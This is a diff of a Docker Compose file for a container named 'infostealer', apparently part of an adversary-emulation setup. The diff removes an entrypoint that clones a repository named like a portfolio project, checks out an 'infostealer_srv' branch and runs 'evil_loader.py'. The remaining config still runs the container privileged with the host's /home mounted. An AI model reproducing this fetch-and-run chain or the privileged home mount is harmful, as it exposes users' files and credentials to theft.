@@ -1,21 +1,9 @@
 services:
   infostealer:
-    image: python:3.12.2-slim
+    build: .
     container_name: infostealer
-    privileged: true
+    privileged: true        # keep if you really need it
     volumes:
       - /home:/home
     ports:
       - "80:80"
-    working_dir: /
-    entrypoint: sh -c "
-      apt-get update && apt-get install -y git &&
-      git clone https://github.com/phantombyte-security/montecarlo-portfolio-management.git /root/project &&
-      pip install --upgrade pip &&
-      pip install requests &&
-      cd /root/project &&
-      git checkout infostealer_srv &&
-      cp /root/project/emulation/evil_loader.py /root/ &&
-      rm -rf /root/project &&
-      cd /root &&
-      python3 evil_loader.py"
